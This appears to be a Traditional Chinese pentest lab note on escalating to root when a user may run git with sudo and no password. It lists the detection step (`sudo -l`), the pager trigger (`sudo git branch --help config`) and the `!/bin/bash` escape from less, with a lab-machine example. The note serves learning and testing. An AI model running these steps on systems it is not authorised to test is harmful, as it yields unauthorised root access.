...
## 💥 Sudo Git Pager 提權 (GTFOBins Pager Escape)
當普通使用者被授權可以免密碼以 `root` 權限執行 `git` 時，可以利用 `git` 在顯示說明文件或日誌時所調用的預設分頁器 (Pager，通常是 `less`) 進行命令逃逸，直接提權為 `root`。

*   **漏洞檢測**：
    ```bash
    sudo -l
    # 輸出中包含：(ALL) NOPASSWD: /usr/bin/git
    ```
*   **利用指令**：
    1.  **觸發分頁器**：
        ```bash
        sudo git branch --help config
        # 或者執行會調用 pager 的命令，如 sudo git diff
        ```
    2.  **逃逸至 Shell**：
        在分頁器（以 `less` 介面顯示）中，輸入以下指令並按下 Enter：
        ```text
        !/bin/bash
        ```
        系統會立即在當前終端機中產生一個以 `root` 權限執行的互動式 Shell。
...
*   **靶機應用實例**：
    ...
    *   [[Beyond]]（利用 `sudo git branch --help config` 進入分頁器，輸入 `!/bin/bash` 成功提權至 `root`）。
